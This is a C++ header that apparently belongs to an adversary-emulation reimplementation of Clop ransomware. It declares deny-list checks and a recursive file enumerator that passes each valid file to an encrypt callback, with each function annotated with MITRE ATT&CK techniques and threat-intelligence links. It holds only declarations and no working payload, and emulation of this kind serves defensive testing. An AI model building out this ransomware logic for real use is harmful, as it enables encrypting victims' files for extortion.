#pragma once
#include <filesystem>
#include <functional>
#include <string>
#include <vector>

#include "core.hpp"
#include "core_minimal.hpp"
#include "xor_obfuscation.hpp"


namespace Enumeration {

    /*
     * CheckValidity(std::string value, std::vector<size_t> denyList, std::string message)
     *      About:
     *         Check a given value against the given list of values to skip and if it
     *         should be skipped, log the given message
     *      Returns:
     *          [bool] True if the value is valid, indicating that the associated file or
     *          directory should be encrpyted or further enumerated for files to encrypt,
     *          false otherwise
     *      MITRE ATT&CK Techniques:
     *          T1083 - File and Directory Discovery
     *      CTI:
     *          https://www.mcafee.com/blogs/other-blogs/mcafee-labs/clop-ransomware/
     */
    bool CheckValidity(std::string value, std::vector<size_t> denyList, std::string message);

    /*
     * CheckValidDirectory(std::string directory)
     *      About:
     *         Check a given directory name against a predefined list of directories to skip
     *      Returns:
     *          [bool] True if the directory is valid and should be further enumerated for files
     *          to  encrypt, false otherwise
     *      MITRE ATT&CK Techniques:
     *          T1083 - File and Directory Discovery
     *      CTI:
     *          https://www.mcafee.com/blogs/other-blogs/mcafee-labs/clop-ransomware/
     */
    bool CheckValidDirectory(std::string directory);

    /*
     * CheckValidFilename(std::string filename)
     *      About:
     *         Check a given file name against a predefined list of file names to skip
     *      Returns:
     *          [bool] True if the file name is valid and should be encrypted, false otherwise
     *      MITRE ATT&CK Techniques:
     *          T1083 - File and Directory Discovery
     *      CTI:
     *          https://www.mcafee.com/blogs/other-blogs/mcafee-labs/clop-ransomware/
     */
    bool CheckValidFilename(std::string filename);

    /*
     * CheckValidExtension(std::string extension)
     *      About:
     *         Check a given file extension against a predefined list of extensions to skip
     *      Returns:
     *          [bool] True if the extension is valid and should be encrypted, false otherwise
     *      MITRE ATT&CK Techniques:
     *          T1083 - File and Directory Discovery
     *      CTI:
     *          https://www.mcafee.com/blogs/other-blogs/mcafee-labs/clop-ransomware/
     */
    bool CheckValidExtension(std::string extension);

    /*
     * EnumerateFiles(std::string path, std::function<bool(const std::string)> encrypt)
     *      About:
     *         Recursively find all valid files at the given path and call the "encrypt"
     *         callback on them
     *      Result:
     *          All valid files have been encrypted
     *      MITRE ATT&CK Techniques:
     *          T1083 - File and Directory Discovery
     *          T1119 - Automated Collection
     *      CTI:
     *          https://www.mcafee.com/blogs/other-blogs/mcafee-labs/clop-ransomware/
     */
    void EnumerateFiles(std::string path, std::function<bool(const std::string)> encrypt);
}